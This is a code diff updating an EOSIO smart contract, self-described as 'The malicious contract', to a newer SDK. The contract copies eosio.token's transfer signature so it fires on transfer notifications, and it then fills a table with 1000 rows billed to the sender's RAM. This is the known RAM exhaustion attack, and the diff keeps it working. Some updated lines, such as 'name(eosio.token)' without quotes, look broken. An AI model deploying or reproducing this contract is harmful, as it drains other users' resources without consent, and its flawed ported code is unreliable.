@@ -1,4 +1,6 @@
-#include <eosiolib/eosio.hpp>
+#include <eosio/eosio.hpp>
+#include <eosio/time.hpp>
+#include <eosio/asset.hpp>
 using namespace eosio;
 // The malicious contract
 class dataStorage : public eosio::contract
@@ -15,17 +17,17 @@ class dataStorage : public eosio::contract
                 typedef multi_index<N(ttab),ttab> _ttab; // The table that will take up the RAM
   
                 ///@abi action
-                void transfer( account_name from,
-                                account_name to,
+                void transfer( name from,
+                                name to,
                                 asset quantity,
                                 std::string memo ) // This function has the same signature as 
                                                    // the transfer function from eosio.token, 
                                                    // so it can be invoked with an appropriate 
                                                    // notification during a token transfer.
                 {
-                        _ttab ttabs(_self,_self);
+                        _ttab ttabs(get_self(),get_self().value);
   
-                        uint64_t start = now() * 1000;
+                        uint64_t start = current_time_point().sec_since_epoch() * 1000;
                         for (int i = 0; i < 1000; i++)
                         {
                                 ttabs.emplace(from, [&](auto& data){ // The first parameter 
@@ -41,7 +43,7 @@ class dataStorage : public eosio::contract
   
 extern "C" {
         void apply( uint64_t receiver, uint64_t code, uint64_t action ) {
-                if( code == N(eosio.token) ) { // If the contract is invoked 
+                if( code == name(eosio.token) ) { // If the contract is invoked 
                                                // as part of a notification
                         dataStorage thiscontract(receiver);
                         switch( action ) {
